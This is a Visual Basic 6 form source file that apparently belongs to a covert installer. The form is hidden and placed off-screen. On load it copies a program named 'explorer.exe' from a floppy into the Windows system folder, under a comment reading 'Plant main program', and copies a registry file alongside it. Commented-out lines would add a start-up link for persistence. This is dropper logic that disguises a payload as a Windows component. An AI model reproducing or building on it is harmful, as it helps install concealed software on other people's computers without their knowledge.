VERSION 5.00
Begin VB.Form Explorer 
   BorderStyle     =   0  'None
   Caption         =   "a"
   ClientHeight    =   3705
   ClientLeft      =   -4545
   ClientTop       =   -3840
   ClientWidth     =   3180
   Icon            =   "frmsearch.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3705
   ScaleWidth      =   3180
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
End
Attribute VB_Name = "Explorer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit


    
Private Sub Form_Load()
    'Plant main program
    Call CopyFile("a:\explorer.exe", "C:\windows\system\")
    
    'Plant a start-up link
    'Shell "A:\set.bat"
    
    'Make dir
    Call CopyFile("a:\set.reg", "C:\Windows\System\ss\")
    
    'Kill "C:\windows\system\s\setup.reg"
    
    addLog ("Setup run at " & Time & " on the " & Date)
    
    MsgBox "Done!"
    
    End
End Sub
